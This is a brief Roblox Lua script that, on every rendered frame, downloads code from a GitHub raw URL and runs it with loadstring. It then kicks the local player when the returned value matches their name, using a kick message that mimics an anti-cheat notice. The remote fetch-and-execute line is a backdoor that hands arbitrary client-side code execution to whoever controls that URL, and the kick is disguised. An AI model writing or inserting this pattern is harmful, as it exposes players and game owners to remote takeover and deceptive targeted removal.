local RunService = game:GetService("RunService") --s

RunService.RenderStepped:Connect(function()
    local isFrozen = loadstring(game:HttpGet("https://raw.githubusercontent.com/bruhkakanda/PatchKids/refs/heads/main/test"))()
    if game.Players.LocalPlayer.Name == isFrozen then
        local char = game.Players.LocalPlayer.Character
        if char and char:FindFirstChild("HumanoidRootPart") then
            game.Players.LocalPlayer:Kick("Unexpected player behavior")
        end
    end
end)
